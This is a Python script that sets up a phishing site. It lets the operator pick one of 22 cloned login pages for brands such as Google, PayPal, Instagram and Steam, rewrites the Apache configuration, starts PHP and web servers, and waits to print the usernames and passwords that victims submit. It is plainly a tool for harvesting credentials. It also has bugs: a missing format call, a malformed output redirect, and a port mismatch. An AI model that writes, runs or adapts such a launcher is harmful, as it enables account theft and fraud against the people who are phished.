#!/usr/bin/python3
import os
import time

sites = {
    "1": "adobe",
    "2": "badoo",
    "3": "devianart",
    "4": "google",
    "5": "instafollowers",
    "6": "instagram",
    "7": "linkedin",
    "8": "messenger",
    "9": "microsoft",
    "10": "myspace",
    "11": "netflix",
    "12": "paypal",
    "13": "pinterest",
    "14": "shopify",
    "15": "spotify",
    "16": "twitch",
    "17": "twitter",
    "18": "snapchat",
    "19": "verizon",
    "20": "wordpress",
    "21": "yahoo",
    "22": "steam",
}

print("Website options:")
print("[1]  Adobe               [11] Netflix            [21] Yahoo")
print("[2]  Badoo               [12] PayPal             [22] Steam")
print("[3]  DevianArt           [13] Pinterest")
print("[4]  Google              [14] Shopify")
print("[5]  Instafollowers      [15] Spotify")
print("[6]  Instagram           [16] Twitch")
print("[7]  LinkedIn            [17] Twitter")
print("[8]  Messenger           [18] Snapchat")
print("[9]  Microsoft           [19] Verizon")
print("[10] Myspace             [20] Wordpress")

web_num = input("\nPlease enter a number: ")
website = sites[web_num]

# Remove log files if they have been previously saved
if os.path.exists("/phish/sites/{}/ip.txt".format(website)):
    print("Removing old ip.txt file...")
    os.remove("/phish/sites/{}/ip.txt".format(website))

if os.path.exists("/phish/sites/{}/usernames.txt"):
    print("Removing old usernames.txt file...")
    os.remove("/phish/sites/{}/usernames.txt".format(website))

print("\n")
print("Setting up DocumentRoot for apache...")
os.system(
    "sed -i 's!/var/www/localhost/htdocs!/phish/sites/{}!g' /etc/apache2/httpd.conf".format(
        website
    )
)
time.sleep(1)

print("Starting php server...")
os.system(
    "chmod 777 /phish/sites/{}".format(website)
)  # Add permissions for the php files
os.system(
    "cd /phish/sites/{}/ && php -S 127.0.0.1:80 > /dev/null 2&>1 & sleep 2".format(
        website
    )
)

print("Starting web server...\n")
os.system("httpd 2> /dev/null")
time.sleep(2)

print("Open 'localhost:3333' on your local machine.\n")

print("Waiting for credentials...")
while 1:
    if os.path.exists("/phish/sites/{}/usernames.txt".format(website)):
        creds = open("/phish/sites/{}/usernames.txt".format(website)).read()
        print(creds)
        break
